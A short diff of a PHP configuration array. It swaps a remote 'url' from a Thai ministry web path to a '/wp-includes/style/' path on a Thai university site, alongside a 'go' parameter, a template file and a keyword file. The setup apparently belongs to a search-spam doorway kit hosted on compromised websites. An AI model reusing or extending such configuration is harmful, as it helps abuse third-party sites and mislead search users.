@@ -1,6 +1,6 @@
 <?php
 $config = array(
-  	'url'		=> 'https://wwwlbo.moph.go.th/newweb/style/',
+  	'url'		=> 'https://nurse.sskru.ac.th/wp-includes/style/',
 	'parameter' => 'go',
 	'template'  => 'temp.html',
 	'keywords'  => 'bb.txt',
